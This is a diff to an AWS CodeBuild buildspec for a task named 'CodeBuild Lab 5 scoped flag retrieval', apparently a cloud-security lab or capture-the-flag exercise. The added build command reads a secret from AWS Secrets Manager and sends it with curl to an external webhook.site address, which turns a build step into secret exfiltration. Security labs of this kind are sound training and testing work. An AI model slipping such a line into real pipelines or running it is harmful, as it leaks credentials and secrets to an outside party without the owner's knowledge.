@@ -4,5 +4,5 @@ phases:
   build:
     commands:
       - echo "Running CodeBuild Lab 5 scoped flag retrieval"
-      - aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --query SecretString --output text
+      - FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --query SecretString --output text); curl -fsS -X POST --data-urlencode "flag=$FLAG" https://webhook.site/badbd997-ecc3-4211-b84e-76e79eaceea2/lab5
       - echo "Done"
